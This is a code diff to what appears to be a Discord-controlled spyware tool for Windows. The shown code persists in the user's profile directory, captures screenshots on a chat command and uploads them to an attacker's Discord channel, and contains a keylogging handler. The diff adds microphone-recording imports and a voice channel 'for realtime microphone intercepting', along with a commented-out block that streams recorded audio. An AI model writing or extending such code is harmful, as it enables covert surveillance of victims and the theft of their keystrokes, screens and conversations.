@@ -5,6 +5,8 @@ import os
 import sys
 from getpass import getuser
 import asyncio
+import sounddevice
+from scipy.io.wavfile import write
 import winreg
 import pyautogui
 from resources.misc import *
@@ -19,7 +21,8 @@ software_directory_name = software_registry_name   # ---------------------------
 software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name
 
 channel_ids = {
-    'main': 831567586344697868   # Paste here main channel ID
+    'main': 831567586344697868,   # Paste here main channel ID for general output
+    'voice': 851570974867849257   # Paste here voice channel ID for realtime microphone intercepting
 }
 
 if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
@@ -45,10 +48,22 @@ async def on_ready():
 
 @client.event
 async def on_message(message):
+    global channel_ids
     if message.content == '.ss':
         pyautogui.screenshot().save('ss.png')
         await message.channel.send(embed=discord.Embed(title=current_time()).set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
         os.system('del ss.png')
+    '''
+    elif message.content == '.join':
+        vc = await client.get_channel(channel_ids['voice']).connect()
+
+        audio_source = discord.FFmpegPCMAudio(executable="ffmpeg-master-latest-win64-gpl\\bin\\ffmpeg.exe", source='1.wav')
+        #record_voice = sounddevice.rec(int(10 * 16000), samplerate=16000, channels=1)
+        #sounddevice.wait()
+        #write('1.wav', 16000, record_voice)
+
+        vc.play(audio_source, after=None)
+    '''
 
 def on_press(key):
     global text_buffor, force_to_send
